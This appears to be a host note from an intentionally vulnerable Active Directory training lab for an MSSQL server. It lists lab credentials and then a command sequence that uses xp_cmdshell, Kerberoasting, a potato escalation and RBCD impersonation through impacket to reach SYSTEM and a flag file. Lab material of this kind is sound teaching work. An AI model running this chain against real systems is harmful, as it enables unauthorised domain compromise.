# sql01.corp.local — 10.10.0.14

MSSQL server. RBCD set on SQL01$ (svc_vision can act-on-behalf-of) and SQL Server is configured mixed-mode with `xp_cmdshell` available.

## Listening ports

| Port | Proto | Service | Notes |
|---|---|---|---|
| 135/139/445 | TCP | RPC + SMB | |
| 1433 | TCP | MSSQL | SA = `SqlServer2025!`, mixed mode, `xp_cmdshell` enabled |
| 1434 | UDP | SQL Browser | **expected but currently not auto-started** (gap — IA-018 plan) |
| 3389 | TCP | RDP | |
| 5985 | TCP | WinRM | |

## SQL specifics

- `svc_jarvis` SPN: `MSSQLSvc/sql01.corp.local:1433` and `MSSQLSvc/sql01.corp.local` (no port) — Kerberoast both
- `svc_sql_low` is `SeImpersonatePrivilege` holder → potato path on sql01 after MSSQL RCE
- `StorSvc` and `CDPSvc` set auto-start (PE-043 / PE-044 LPE primitives)

## RBCD

`SQL01$ msDS-AllowedToActOnBehalfOfOtherIdentity` ← `svc_vision` → S4U2Proxy as Administrator to `cifs/sql01` → SYSTEM.

## Minimum enum sweep

```bash
S=10.10.0.14
nmap -p 1433,1434 -sU -sV --script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password $S
nxc mssql $S -u 'sa' -p 'SqlServer2025!' --local-auth -q "SELECT @@version"
nxc mssql $S -u peter.parker -p 'DVADlab2024!' -q "SELECT system_user, is_srvrolemember('sysadmin')"
mssqlclient.py -windows-auth corp/peter.parker:'DVADlab2024!'@$S
# inside:
SQL> enum_links
SQL> enum_impersonate
SQL> xp_cmdshell whoami
# RBCD:
impacket-getST -spn cifs/sql01.corp.local -impersonate Administrator \
    -dc-ip 10.10.0.10 corp.local/svc_vision:'<pwd>'
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass sql01.corp.local
```

Flag: `C:\Flags\sql-system.txt`.

## Forward to

CRED-001 (Kerberoast svc_jarvis), CRED-017 (RBCD), PE-043/044 (StorSvc/CDPSvc), LAT-026 (MSSQL linked server pivot).
